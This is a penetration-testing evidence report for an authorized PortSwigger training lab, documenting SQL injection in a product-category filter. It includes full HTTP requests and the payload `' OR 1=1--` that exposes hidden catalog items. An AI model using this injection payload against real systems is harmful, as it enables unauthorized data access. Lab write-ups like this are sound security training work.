# WEB-001 Evidence, SQL Injection

## Authorization
- **Lab alias**: LAB-WEB-01
- **Named PortSwigger lab**: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- **Test date**: 2026-09-08


---

![SQLI](https://github.com/Adeconcept/Velora-GmbH/blob/3fbbe6cf37af0a69ee8e92c4b63c5b03fdb5004b/Web-app-Penetration-testing/Evidence/Screenshots/01-Burp-scope-and-http-history.png)

*Figure 1. Burp scope and HTTP history.*

---


## Hypothesis
The category input changes server-side query logic because it is not safely parameterized. If the parameter is concatenated directly into a database `WHERE` clause, appending a true Boolean condition will bypass the application's filtration rules and force the data layer to expose hidden, unreleased inventory items.

## Control request
```http
GET /filter?category=Clothing%2c+shoes+and+accessories HTTP//1.1
Host: REDACTED_LAB_HOST
Cookie: session=REDACTED_SESSION_STRING
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: REDACTED_REFERER
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
```

## Control response summary
- **Status**: 200 OK
- **Length**: 4,931 bytes
- **Released products visible**: Portable Hat (Truncated in visual buffer)
- **Unreleased product visible**: No


## Test request
```http
GET /filter?category=Clothing%2c+shoes+and+accessories'+OR+1=1-- HTTP/1.1
Host: REDACTED_LAB_HOST
Cookie: session=REDACTED_SESSION_STRING
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: REDACTED_REFERER
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

## Test response summary
- **Status**: 200 OK
- **Length**: 11,597 bytes *(Reflective of additional inventory data generation)*
- **Additional products visible**: Dynamic extraction of full table content encompassing unreleased inventory lines outside the standard category definition block.
- **Unreleased product visible**: Yes (Confirmed via live site alteration and application dashboard state shift to `is-solved`).

## Conclusion
- **Outcome**: Fail (The application failed the isolation parameters, confirming the vulnerability)
- **Reproduced**: Yes
- **Minimum impact proven**: Insecure direct parameter interpolation. An unauthenticated remote agent can append standard SQL structures to modify the underlying data access queries, bypassing business isolation rules to read unreleased product items.
- **Test stopped after**: Visual verification of hidden catalog rows and successful generation of the platform completion element (`class='academyLabBanner is-solved'`). No structural table schema lookups or account modification requests were run.
- **Evidence label**: Tested on authorized training lab
Use code with caution.

